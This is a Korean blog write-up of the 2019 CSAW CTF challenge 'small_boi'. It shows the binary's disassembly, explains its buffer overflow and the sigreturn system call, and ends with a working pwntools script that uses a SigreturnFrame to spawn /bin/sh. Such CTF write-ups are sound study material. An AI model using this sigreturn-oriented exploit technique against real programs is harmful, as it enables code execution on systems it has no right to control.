---
title: "2019 CSAW CTF small_boi"
date: 2020-1-23
tags: [CSAW]
categories: [CSAW]
---

매우 작은 바이너리다. SigReturn Oriented Programming을 이용해서 풀 수 있다.

```
.text:000000000040017C sub_40017C      proc near
.text:000000000040017C ; __unwind {
.text:000000000040017C                 push    rbp
.text:000000000040017D                 mov     rbp, rsp
.text:0000000000400180                 mov     eax, 15
.text:0000000000400185                 syscall                 ; LINUX - sys_rt_sigreturn
.text:0000000000400187                 nop
.text:0000000000400188                 pop     rbp
.text:0000000000400189                 retn
.text:0000000000400189 ; } // starts at 40017C
.text:0000000000400189 sub_40017C      endp
.text:0000000000400189
.text:000000000040018A ; ---------------------------------------------------------------------------
.text:000000000040018A                 pop     rax
.text:000000000040018B                 retn
.text:000000000040018C
.text:000000000040018C ; =============== S U B R O U T I N E =======================================
.text:000000000040018C
.text:000000000040018C ; Attributes: bp-based frame
.text:000000000040018C
.text:000000000040018C sub_40018C      proc near               ; CODE XREF: start+9↓p
.text:000000000040018C
.text:000000000040018C buf             = byte ptr -20h
.text:000000000040018C
.text:000000000040018C ; __unwind {
.text:000000000040018C                 push    rbp
.text:000000000040018D                 mov     rbp, rsp
.text:0000000000400190                 lea     rax, [rbp+buf]
.text:0000000000400194                 mov     rsi, rax        ; buf
.text:0000000000400197                 xor     rax, rax
.text:000000000040019A                 xor     rdi, rdi        ; fd
.text:000000000040019D                 mov     rdx, 200h       ; count
.text:00000000004001A4                 syscall                 ; LINUX - sys_read
.text:00000000004001A6                 mov     eax, 0
.text:00000000004001AB                 pop     rbp
.text:00000000004001AC                 retn
.text:00000000004001AC ; } // starts at 40018C
.text:00000000004001AC sub_40018C      endp
.text:00000000004001AC
.text:00000000004001AD
.text:00000000004001AD ; =============== S U B R O U T I N E =======================================
.text:00000000004001AD
.text:00000000004001AD ; Attributes: bp-based frame
.text:00000000004001AD
.text:00000000004001AD                 public start
.text:00000000004001AD start           proc near               ; DATA XREF: LOAD:0000000000400018↑o
.text:00000000004001AD ; __unwind {
.text:00000000004001AD                 push    rbp
.text:00000000004001AE                 mov     rbp, rsp
.text:00000000004001B1                 mov     eax, 0
.text:00000000004001B6                 call    sub_40018C
.text:00000000004001BB                 xor     rax, rdi
.text:00000000004001BE                 mov     rax, 3Ch
.text:00000000004001C5                 syscall                 ; LINUX - sys_exit
.text:00000000004001C7                 nop
.text:00000000004001C8                 pop     rbp
.text:00000000004001C9                 retn
.text:00000000004001C9 ; } // starts at 4001AD
.text:00000000004001C9 start           endp
.text:00000000004001C9
.text:00000000004001C9 _text           ends
.rodata:00000000004001CA ; ===========================================================================
.rodata:00000000004001CA
.rodata:00000000004001CA ; Segment type: Pure data
.rodata:00000000004001CA ; Segment permissions: Read
.rodata:00000000004001CA _rodata         segment byte public 'CONST' use64
.rodata:00000000004001CA                 assume cs:_rodata
.rodata:00000000004001CA                 ;org 4001CAh
.rodata:00000000004001CA aBinSh          db '/bin/sh',0
.rodata:00000000004001CA _rodata         ends
```

`read(0,rbp+buf,0x200)` 이렇게 입력을 받는데 버퍼 사이즈는 0x20이니까 리턴을 덮을 수 있다. 가젯들이 충분하지 않지만 pop rax 가젯은 존재해서 syscall 컨트롤할 수 있다.

  `sys_rt_sigreturn` 함수를 이용해서 풀 수 있다. 이 함수는 syscall 0xf번이고 레지스터 값을 임의로 변경할 수 있다. 

`sigreturn` 시스템 함수는 Signal을 처리하는 프로세스가 Kernel Mode에서 User Mode로 돌아올 때 스택을 복원하기 위해 사용되는 함수다. 이 시스템 함수 내부를 보면 `restore_sigcontext()` 이 있는데 COPY()를 이용해서 Stack에 저장된 값을 레지스터에 넣을 수 있다. 사용할만한 가젯이 없을 때 사용하기 용이하다. 

```python
from pwn import *

context.arch = 'amd64'
e = ELF('./small_boi')
p = process('./small_boi')
prax = 0x000000000040018a # pop rax ; ret
binsh = 0x00000000004001CA # /bin/sh
syscall = 0x0000000000400185 # syscall
sigreturn = 0x0000000000400185 # sys_rt_sigreturn

payload = 'A'*32 + 'realsung'
payload += p64(prax) + p64(15)
payload += p64(sigreturn)

frame = SigreturnFrame(kernel='amd64')
frame.rax = 0x3b
frame.rdi = binsh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

payload += str(frame)
p.send(payload)

p.interactive()
```



